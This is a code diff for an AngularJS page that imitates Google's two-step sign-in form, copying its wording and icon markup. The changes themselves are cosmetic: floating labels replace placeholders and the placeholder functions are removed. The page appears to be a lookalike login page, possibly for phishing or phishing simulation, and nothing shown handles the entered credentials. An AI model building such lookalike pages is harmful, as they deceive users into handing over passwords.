@@ -14,13 +14,15 @@
         <h2 ng-if="step==1">Sign in</h2>
         <p ng-if="step==1" class="line1">Use your google account</p>
         <div ng-if="step==1" class="form-group">
-            <input ng-style="showError && {'border-color': 'red'}" id="Username" type="text" class="form-control" ng-model="EmailOrPhone" placeholder="Email or phone"
-                   ng-focus="clearPlaceholder()" ng-blur="restorePlaceholder()" required>
-            <div ng-if="showError"  style="text-align: left; color: rgb(217,48,37);">
-                <span>
-                    <svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
-                </span>
-                Enter an email or phone number
+            <div class="floating-label-group">
+                <input ng-style="showError && {'border-color': 'red'}" type="text" id="Username" class="form-control" ng-model="EmailOrPhone" autocomplete="off" autofocus required/>
+                <label class="floating-label" ng-style="showError && {'color': 'rgb(217,48,37)'}">Email or phone</label>
+                <div ng-if="showError"  style="text-align: left; color: rgb(217,48,37);">
+                    <span>
+                        <svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                    </span>
+                        Enter an email or phone number
+                </div>
             </div>
             <div>
                 <button class="blue-button">Forgot email?</button>
@@ -44,16 +46,19 @@
             <span><svg aria-hidden="true" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg></span>
         </div>
         <div style="padding-top: 24px; margin-bottom: 20px;" ng-if="step==2" class="form-group">
-            <input ng-style="showError && {'border-color': 'red'}" id="Password" type="password" class="form-control" ng-model="Password" placeholder="Enter your password"
-                   ng-focus="clearPlaceholder()" ng-blur="restorePlaceholder()" required>
-            <div ng-if="showError"  style="text-align: left; color: rgb(217,48,37);">
-                <span>
-                    <svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
-                </span>
-                Enter a password
-            </div>
-            <div style="text-align: left">
-                <input style="margin-right: 10px; border-color: black; color: black" type="checkbox" id="showPasswordCheckbox" ng-click="togglePassword()"> Show Password
+
+            <div class="floating-label-group">
+                <input ng-style="showError && {'border-color': 'red'}" type="password" id="Password" class="form-control" ng-model="Password" autocomplete="off" autofocus required/>
+                <label class="floating-label" ng-style="showError && {'color': 'rgb(217,48,37)'}">Enter your password</label>
+                <div ng-if="showError"  style="text-align: left; color: rgb(217,48,37);">
+                    <span>
+                        <svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                    </span>
+                    Enter a password
+                </div>
+                <div style="text-align: left">
+                    <input style="margin-right: 10px; border-color: black; color: black" type="checkbox" id="showPasswordCheckbox" ng-click="togglePassword()"> Show Password
+                </div>
             </div>
         </div>
         <div style="margin-top: 50px" ng-if="step==2">
@@ -101,22 +106,6 @@
                 }
             }
         };
-        $scope.clearPlaceholder = function (){
-            if($scope.step == 1){
-                document.getElementById('Username').placeholder = '';
-            }
-            else{
-                document.getElementById('Password').placeholder = '';
-            }
-        }
-        $scope.restorePlaceholder = function (){
-            if($scope.step == 1){
-                document.getElementById('Username').placeholder = 'Email or phone'
-            }
-            else{
-                document.getElementById('Password').placeholder = 'Enter your password'
-            }
-        }
         $scope.togglePassword = function () {
             var passwordInput = document.getElementById("Password");
             var showPasswordCheckbox = document.getElementById("showPasswordCheckbox");
